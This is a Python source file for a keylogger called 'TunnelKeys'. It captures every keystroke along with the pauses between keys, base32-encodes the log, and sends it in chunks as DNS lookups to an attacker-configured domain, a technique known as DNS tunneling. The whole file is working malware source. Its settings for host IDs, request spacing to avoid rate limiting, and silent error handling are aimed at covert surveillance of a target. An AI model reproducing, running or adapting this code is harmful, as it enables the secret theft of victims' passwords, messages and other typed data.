"""
  _____                       _ _  __     
 |_   _|   _ _ __  _ __   ___| | |/ /___ _   _ ___ 
   | || | | | '_ \| '_ \ / _ | | ' // _ | | | / __| 
   | || |_| | | | | | | |  __| | . |  __| |_| \__ \ 
   |_| \__,_|_| |_|_| |_|\___|_|_|\_\___|\__, |___/
                                         |___/
"""

### >> Imports << ###

import time
import base64
import keyboard
import dns.resolver


### >> Configuration << ###
Config = {
    "hostId": "5f",                         # The host ID to identify the target (hex recommended for more possible targets)
    "domain": "example.com",                # The domain to send the captured keys to (e.g. domain_name.tld)
    "min_threshold_between_keys": 5,        # Minimum seconds to log the threshold between keys
    "threshold_between_dns_requests": 15,   # Threshold in seconds between each DNS request (Avoid rate limiting)
    "printSendings": True                   # Print the sent DNS requests (for debugging purposes)
}

### >> Global Variables (Do Not Touch) << ###
capturedKeys = ""
lastCapturedKeyTime = 0
maxDecodedChars = 0

### >> Functions << ###
## > Calculate Maximum Subdomain Length
def calculateMaxSubdomainLength():
    """
    Calculates the maximum number of decoded characters that can be sent in a single request (based on base32),
    ensuring that the encoded data does not exceed the subdomain length limit (63 characters).
    
    Args:
        None
    
    Returns:
        int: The maximum number of decoded characters that can be sent in a single request.
    """

    # > Local Variables
    maxFQDNLength = 255
    maxSubdomainLength = 63
    
    # The available space for the subdomain (maximum FQDN length - 1 subdomain dot - target ID length - 1 sub-subdomain dot - domain length - 1 TLD dot)
    availableSubdomainLength = maxFQDNLength - 1 - len(str(Config['hostId'])) - 1 - len(Config['domain']) - 1
    
    # The final subdomain length should not exceed the max subdomain length of 63
    finalMaxSubdomainLength = min(availableSubdomainLength, maxSubdomainLength)
    
    # To prevent the encoded data from exceeding the subdomain length, reverse the Base32 expansion.
    # Base32 encoding expands data by a factor of 8/5, so to get the max decoded length, we multiply by 5/8 and minus 1 for safety.
    decodedMaxSubdomainLength = int((finalMaxSubdomainLength * 5) / 8)

    # Ensure that the decoded length corresponds to no more than 56 base32 characters (35 decoded characters --> 56 base32 characters)
    if decodedMaxSubdomainLength > 35: decodedMaxSubdomainLength = 35

    return decodedMaxSubdomainLength 
    
## > Key Press Event
def onKeyPress(event):
    """
    Capture keys on key press event.

    Args: 
        event (keyboard.on_press): The event object that contains information about the key press event.

    Returns:
        None
    """

    # > Global Variables
    global capturedKeys
    global lastCapturedKeyTime


    # Log threshold between keys
    logThresholdBetweenKeys()

    # Store captured key
    capturedKeys += event.name.replace(" ", "") + " " # Remove spaces from key name, add space after each key

    # Update last captured key time
    lastCapturedKeyTime = time.time()
    
## > Log Threshold Between Keys
def logThresholdBetweenKeys():
    """
    Logs the threshold between keys.

    Args:
        None

    Returns:
        None    
    """

    # > Global Variables
    global capturedKeys
    global lastCapturedKeyTime

    # If no keys have been captured before, skip calculation
    if lastCapturedKeyTime == 0: return

    # Calculate the time difference between the current time and the last captured key time
    thresholdBetweenKeys = time.time() - lastCapturedKeyTime

    # Log the threshold between keys if it exceeds the minimum threshold
    if thresholdBetweenKeys > Config["min_threshold_between_keys"]: 
        capturedKeys += f"[{int(thresholdBetweenKeys)}] "

## > Base32 Encode
def base32Encode(data):
    """
    Encodes the data to base32 (dns-safe).

    Args:
        None

    Returns:
        str: The encoded chunk of the captured keys.
    """

    # Encode the data to base32 and return the encoded data
    return base64.b32encode(data.encode()).decode()


## > Send Captured Keys
def sendCapturedKeys(chunk):
    """
    Sends the captured keys to the DNS server via DNS Tunneling.

    Args:
        chunk (str): The chunk of captured keys to send.

    Returns:
        bool: True if the keys were sent successfully, False otherwise.
    """

    # > Local Variables
    encoded_chunk = base32Encode(chunk) # Encode the chunk of captured keys
    fqdn = f"{encoded_chunk}.{Config['hostId']}.{Config['domain']}" # FQDN to send the captured keys to

    try:
        # Attempt to resolve the DNS query for type 'A' (IPv4 address)
        dns.resolver.resolve(fqdn, 'A')
    except Exception as e:
        # Ignore any exceptions that will occur during the DNS resolution
        pass

    # Print the sent DNS requests (for debugging purposes)
    if Config["printSendings"]: print(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\nFQDN: {fqdn}\nDecoded Data: {chunk}\n")

## > Initialize Keylogger
def init():
    """
    Initializes the keylogger.

    Args:
        None

    Returns:
        None
    """

    # > Global Variables
    global capturedKeys

    # > Keylogger Loop
    while True:
        # - Sleep if no keys have been captured, yet
        if len(capturedKeys) == 0:
            time.sleep(Config["threshold_between_dns_requests"])
        # - Send the captured keys if they are less than the maximum number of decoded characters that can be sent in a single request
        elif len(capturedKeys) < maxDecodedChars:
            sendCapturedKeys(capturedKeys)
            capturedKeys = "" # Reset the captured keys
        # - Send the maximum allowed number of characters if the captured keys exceed the maximum number of decoded characters that can be sent in a single request
        else: 
            capturedKeys_chunk = capturedKeys[:maxDecodedChars] # Get the first maximum allowed number of characters
            capturedKeys = capturedKeys[maxDecodedChars:] # Remove the sent characters from the captured keys
            sendCapturedKeys(capturedKeys_chunk) # Send the encoded captured keys chunk

        time.sleep(Config["threshold_between_dns_requests"]) # Sleep for the threshold between DNS requests


### >> Main << ###
# Calculate the maximum number of decoded characters that can be sent in a single request
maxDecodedChars = calculateMaxSubdomainLength()

# Start capturing keys
keyboard.on_press(onKeyPress)

# Initialize the keylogger
init()